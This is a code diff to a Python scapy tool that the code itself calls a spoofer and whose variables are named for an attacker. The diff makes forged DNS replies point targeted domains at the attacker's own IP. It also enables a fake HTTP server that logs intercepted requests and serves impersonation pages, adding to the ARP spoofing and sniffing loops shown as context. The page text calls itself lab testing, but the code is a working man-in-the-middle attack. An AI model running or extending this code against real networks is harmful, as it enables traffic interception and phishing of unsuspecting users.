@@ -4,13 +4,14 @@ import threading
 import time
 from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
 import copy
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
+from functools import partial
 
 targets = []
 is_running = True
 lock = threading.Lock()
 
-dns_targets = ["google.com"]
+dns_targets = []
 
 attacker_mac = get_if_hwaddr(conf.iface)
 attacker_ip = get_if_addr(conf.iface)
@@ -56,7 +57,7 @@ def send_packet_info(packet):
                                 qdcount=1,
                                 ancount=1,
                                 qd=newpacket[DNS].qd,
-                                an=DNSRR(rrname=domain, ttl=300, rdata='34.36.121.47')
+                                an=DNSRR(rrname=domain, ttl=300, rdata=attacker_ip)
                             )
 
                             newpacket = ip / udp / dns
@@ -175,13 +176,46 @@ def handle_command(command):
     except Exception as e:
         log_error(f"Failed to handle command: {str(e)}")
 
+def ssl_spoof_handler(request, client_address, server):
+    class Handler(SimpleHTTPRequestHandler):
+        def do_GET(self):
+            host = self.headers.get('Host', 'unknown')
+            log_info(f"Intercepted GET for: {host}{self.path}")
+
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            html = f"""
+            <html>
+            <head><title>Fake Page</title></head>
+            <body>
+                <h1>This is a spoofed version of {host}</h1>
+                <p>All traffic is intercepted for lab testing.</p>
+            </body>
+            </html>
+            """
+            self.wfile.write(html.encode())
+
+        def log_message(self, format, *args):
+            return  # Silence default logging
+
+    return Handler(request, client_address, server)
+
+
+def run_spoofed_http_server():
+    server_address = (attacker_ip, 80)
+    handler = partial(ssl_spoof_handler)
+    httpd = HTTPServer(server_address, handler)
+    log_info(f"Starting spoofed HTTP server on {attacker_ip}:80")
+    httpd.serve_forever()
+
 
 def main():
     log_info("Spoofer started.")
 
     threading.Thread(target=spoof_loop, daemon=True).start()
     threading.Thread(target=sniff_thread, daemon=True).start()
-    # threading.Thread(target=run_spoofed_http_server, daemon=True).start()
+    threading.Thread(target=run_spoofed_http_server, daemon=True).start()
 
     for line in sys.stdin:
         handle_command(line.strip())
